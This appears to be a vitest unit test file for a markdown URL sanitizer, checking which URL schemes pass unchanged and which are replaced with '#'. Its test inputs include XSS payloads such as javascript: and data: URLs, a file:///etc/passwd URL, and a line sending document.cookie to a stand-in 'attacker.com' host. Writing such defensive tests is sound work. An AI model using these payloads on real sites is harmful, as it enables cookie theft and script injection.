/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import { sanitizeUrl } from '../markdownSecurity.js';

describe('markdownSecurity', () => {
  describe('sanitizeUrl', () => {
    describe('Safe URLs - should be preserved', () => {
      it('should allow HTTP URLs', () => {
        expect(sanitizeUrl('http://example.com')).toBe('http://example.com');
        expect(sanitizeUrl('http://subdomain.example.com/path')).toBe('http://subdomain.example.com/path');
        expect(sanitizeUrl('http://example.com:8080/path?query=value')).toBe('http://example.com:8080/path?query=value');
      });

      it('should allow HTTPS URLs', () => {
        expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
        expect(sanitizeUrl('https://secure.example.com/api/v1')).toBe('https://secure.example.com/api/v1');
        expect(sanitizeUrl('https://github.com/user/repo')).toBe('https://github.com/user/repo');
      });

      it('should allow case-insensitive HTTP/HTTPS', () => {
        expect(sanitizeUrl('HTTP://EXAMPLE.COM')).toBe('HTTP://EXAMPLE.COM');
        expect(sanitizeUrl('HTTPS://EXAMPLE.COM')).toBe('HTTPS://EXAMPLE.COM');
        expect(sanitizeUrl('Http://Example.Com')).toBe('Http://Example.Com');
        expect(sanitizeUrl('Https://Example.Com')).toBe('Https://Example.Com');
      });

      it('should allow mailto URLs', () => {
        expect(sanitizeUrl('mailto:user@example.com')).toBe('mailto:user@example.com');
        expect(sanitizeUrl('mailto:support@company.org?subject=Help')).toBe('mailto:support@company.org?subject=Help');
        expect(sanitizeUrl('MAILTO:USER@EXAMPLE.COM')).toBe('MAILTO:USER@EXAMPLE.COM');
      });

      it('should allow tel URLs', () => {
        expect(sanitizeUrl('tel:+1234567890')).toBe('tel:+1234567890');
        expect(sanitizeUrl('tel:555-123-4567')).toBe('tel:555-123-4567');
        expect(sanitizeUrl('TEL:+1-800-555-1234')).toBe('TEL:+1-800-555-1234');
      });

      it('should allow relative URLs starting with /', () => {
        expect(sanitizeUrl('/path/to/page')).toBe('/path/to/page');
        expect(sanitizeUrl('/api/v1/users')).toBe('/api/v1/users');
        expect(sanitizeUrl('/images/logo.png')).toBe('/images/logo.png');
        expect(sanitizeUrl('/')).toBe('/');
      });

      it('should allow fragment URLs starting with #', () => {
        expect(sanitizeUrl('#section1')).toBe('#section1');
        expect(sanitizeUrl('#header-with-dashes')).toBe('#header-with-dashes');
        expect(sanitizeUrl('#')).toBe('#');
      });
    });

    describe('Dangerous URLs - should be sanitized to #', () => {
      it('should sanitize javascript: URLs', () => {
        expect(sanitizeUrl('javascript:alert("xss")')).toBe('#');
        expect(sanitizeUrl('javascript:void(0)')).toBe('#');
        expect(sanitizeUrl('JAVASCRIPT:alert(1)')).toBe('#');
        expect(sanitizeUrl('Javascript:malicious()')).toBe('#');
      });

      it('should sanitize data: URLs', () => {
        expect(sanitizeUrl('data:text/html,<script>alert("xss")</script>')).toBe('#');
        expect(sanitizeUrl('data:image/svg+xml,<svg onload="alert(1)"></svg>')).toBe('#');
        expect(sanitizeUrl('DATA:text/plain,malicious')).toBe('#');
      });

      it('should sanitize vbscript: URLs', () => {
        expect(sanitizeUrl('vbscript:alert("xss")')).toBe('#');
        expect(sanitizeUrl('VBSCRIPT:malicious()')).toBe('#');
      });

      it('should sanitize file: URLs', () => {
        expect(sanitizeUrl('file:///etc/passwd')).toBe('#');
        expect(sanitizeUrl('file://c:/windows/system32/')).toBe('#');
        expect(sanitizeUrl('FILE:///sensitive/path')).toBe('#');
      });

      it('should sanitize ftp: URLs', () => {
        expect(sanitizeUrl('ftp://ftp.example.com/file')).toBe('#');
        expect(sanitizeUrl('FTP://anonymous@ftp.example.com')).toBe('#');
      });

      it('should sanitize other dangerous schemes', () => {
        expect(sanitizeUrl('chrome://settings/')).toBe('#');
        expect(sanitizeUrl('about:blank')).toBe('#');
        expect(sanitizeUrl('view-source:https://example.com')).toBe('#');
        expect(sanitizeUrl('blob:null/12345678-1234-1234-1234-123456789012')).toBe('#');
      });
    });

    describe('Malformed URLs - should be handled gracefully', () => {
      it('should sanitize malformed URLs', () => {
        expect(sanitizeUrl('not-a-url')).toBe('#');
        expect(sanitizeUrl('://missing-scheme')).toBe('#');
        expect(sanitizeUrl('http://')).toBe('#');
        expect(sanitizeUrl('')).toBe('#');
      });

      it('should handle URLs with missing protocols as relative', () => {
        expect(sanitizeUrl('example.com')).toBe('#');
        expect(sanitizeUrl('www.example.com')).toBe('#');
        expect(sanitizeUrl('subdomain.example.com/path')).toBe('#');
      });

      it('should handle special characters in URLs', () => {
        expect(sanitizeUrl('https://example.com/path with spaces')).toBe('https://example.com/path with spaces');
        expect(sanitizeUrl('https://example.com/path?param=value&other=test')).toBe('https://example.com/path?param=value&other=test');
      });

      it('should handle edge case URLs', () => {
        expect(sanitizeUrl('localhost:3000')).toBe('#');
        expect(sanitizeUrl('127.0.0.1:8080')).toBe('#');
        expect(sanitizeUrl('192.168.1.1')).toBe('#');
      });
    });

    describe('URL parsing edge cases', () => {
      it('should handle URLs that throw parsing errors', () => {
        // These should trigger the catch block in sanitizeUrl
        const problematicUrls = [
          '\\malformed\\url',
          'http://[invalid-ipv6',
          'https://example.com:99999999', // Invalid port
          'scheme:',
          ':invalid'
        ];

        problematicUrls.forEach(url => {
          expect(sanitizeUrl(url)).toBe('#');
        });
      });

      it('should handle URLs with unusual but valid structures', () => {
        // These should be parsed successfully by URL constructor
        expect(sanitizeUrl('https://user:pass@example.com:443/path')).toBe('https://user:pass@example.com:443/path');
        expect(sanitizeUrl('https://[2001:db8::1]:8080/')).toBe('https://[2001:db8::1]:8080/');
      });

      it('should preserve query parameters and fragments in safe URLs', () => {
        expect(sanitizeUrl('https://example.com/search?q=test&type=all#results')).toBe('https://example.com/search?q=test&type=all#results');
        expect(sanitizeUrl('mailto:test@example.com?subject=Hello&body=World')).toBe('mailto:test@example.com?subject=Hello&body=World');
      });
    });

    describe('Real-world security test cases', () => {
      it('should block common XSS vectors', () => {
        const xssVectors = [
          'javascript:alert(document.cookie)',
          'javascript:window.location="http://attacker.com?"+document.cookie',
          'data:text/html,<img src=x onerror=alert(1)>',
          'vbscript:msgbox("XSS")',
          'livescript:alert("XSS")',
          'mocha:alert("XSS")'
        ];

        xssVectors.forEach(vector => {
          expect(sanitizeUrl(vector)).toBe('#');
        });
      });

      it('should allow legitimate external links', () => {
        const legitimateUrls = [
          'https://github.com/microsoft/vscode',
          'https://docs.npmjs.com/cli/v8/commands/npm-install',
          'https://developer.mozilla.org/en-US/docs/Web/API',
          'mailto:support@company.com?subject=Bug%20Report',
          'tel:+1-555-123-4567'
        ];

        legitimateUrls.forEach(url => {
          expect(sanitizeUrl(url)).toBe(url);
        });
      });

      it('should handle URLs with encoded characters', () => {
        expect(sanitizeUrl('https://example.com/search?q=hello%20world')).toBe('https://example.com/search?q=hello%20world');
        expect(sanitizeUrl('https://example.com/path%2Fwith%2Fencoded%2Fslashes')).toBe('https://example.com/path%2Fwith%2Fencoded%2Fslashes');
      });
    });

    describe('Function behavior and error handling', () => {
      it('should be a function', () => {
        expect(typeof sanitizeUrl).toBe('function');
      });

      it('should return a string for all inputs', () => {
        const testUrls = [
          'https://example.com',
          'javascript:alert(1)',
          '/relative/path',
          '#fragment',
          'malformed',
          ''
        ];

        testUrls.forEach(url => {
          const result = sanitizeUrl(url);
          expect(typeof result).toBe('string');
        });
      });

      it('should handle null and undefined gracefully', () => {
        // These would throw in real usage, but let's test string inputs only
        expect(sanitizeUrl('')).toBe('#');
      });
    });
  });
});